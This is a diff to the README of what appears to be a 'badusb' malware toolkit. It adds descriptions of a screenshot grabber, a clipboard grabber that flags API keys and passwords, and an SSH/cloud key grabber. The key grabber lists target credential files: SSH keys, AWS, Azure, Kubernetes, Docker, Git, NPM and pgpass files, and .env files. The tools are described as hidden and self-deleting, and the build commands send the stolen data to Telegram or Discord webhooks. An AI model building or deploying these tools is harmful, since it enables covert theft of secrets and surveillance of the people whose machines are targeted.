@@ -54,6 +54,46 @@ Maps the local network — discovers hosts and open ports. Uses native Windows A
 
 Threaded ARP scan (50 parallel threads) for speed.
 
+### Screenshot Grabber (`badusb/screen/`)
+
+Captures a screenshot of the primary monitor and exfiltrates it. Uses GDI (`BitBlt`, `CreateCompatibleDC`). No PowerShell.
+
+- Captures full primary monitor as BMP
+- Reports: hostname, username, public IP, screen resolution
+- Hidden console, self-deleting
+- ~5 second runtime
+
+### Clipboard Grabber (`badusb/clip/`)
+
+Extracts current clipboard contents with automatic content classification.
+
+- Unicode + ANSI text, file lists (CF_HDROP), image detection
+- **Auto-classifies sensitive content**: API keys (`sk-`, `ghp_`, `AKIA`), passwords, URLs, emails
+- Enumerates all clipboard formats present
+- Hidden console, self-deleting
+- ~5 second runtime
+
+### SSH/Cloud Key Grabber (`badusb/keys/`)
+
+Extracts SSH keys, cloud credentials, and authentication tokens from the user's home directory.
+
+| Target | Files |
+|--------|-------|
+| SSH | `~/.ssh/*` (private keys, config, known_hosts) |
+| AWS | `~/.aws/credentials`, `~/.aws/config` |
+| Azure | `~/.azure/` (tokens, profiles, MSAL cache) |
+| Kubernetes | `~/.kube/config` |
+| Docker | `~/.docker/config.json` |
+| Git | `~/.gitconfig`, `~/.git-credentials` |
+| NPM | `~/.npmrc` (auth tokens) |
+| PostgreSQL | `~/.pgpass`, `pgpass.conf` |
+| Env files | `.env` in ~, Desktop, Documents, Downloads, common dev dirs |
+
+- Skips binary files (reports size only)
+- Reports found vs not-found for each target
+- Hidden console, self-deleting
+- ~5 second runtime
+
 ---
 
 ## Setup
@@ -81,6 +121,11 @@ python tools/build.py browser --discord --webhook https://discord.com/api/webhoo
 
 # Build only network scanner
 python tools/build.py scan --telegram --token YOUR_TOKEN --chat YOUR_CHAT
+
+# Build individual tools
+python tools/build.py screen --telegram --token YOUR_TOKEN --chat YOUR_CHAT
+python tools/build.py clip --telegram --token YOUR_TOKEN --chat YOUR_CHAT
+python tools/build.py keys --telegram --token YOUR_TOKEN --chat YOUR_CHAT
 ```
 
 Or compile manually with Visual Studio:
